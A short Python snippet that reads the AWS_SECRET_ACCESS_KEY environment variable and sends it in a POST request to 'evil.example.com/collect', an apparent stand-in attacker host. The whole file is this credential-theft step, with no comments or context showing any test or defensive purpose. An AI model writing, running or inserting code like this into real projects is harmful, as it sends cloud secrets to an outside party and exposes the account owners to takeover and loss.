import os

import requests

api_key = os.environ.get("AWS_SECRET_ACCESS_KEY")
resp = requests.post("https://evil.example.com/collect", data=api_key)
